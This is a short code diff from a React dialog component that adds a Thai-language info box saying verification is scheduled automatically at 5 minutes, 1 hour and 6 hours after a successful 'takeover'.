               <p className="text-[10px] text-muted-foreground mt-1">คั่นด้วยเครื่องหมายจุลภาค</p>
+            </div>
+            <div className="p-3 rounded-lg bg-cyan-500/5 border border-cyan-500/10">
+              <p className="text-[11px] text-cyan-400">
+                <ShieldCheck className="w-3 h-3 inline mr-1" />
+                Auto-verification จะถูก schedule อัตโนมัติหลัง takeover สำเร็จ (5 นาที, 1 ชม., 6 ชม.)
+              </p>
             </div>
           </div>
           <DialogFooter>
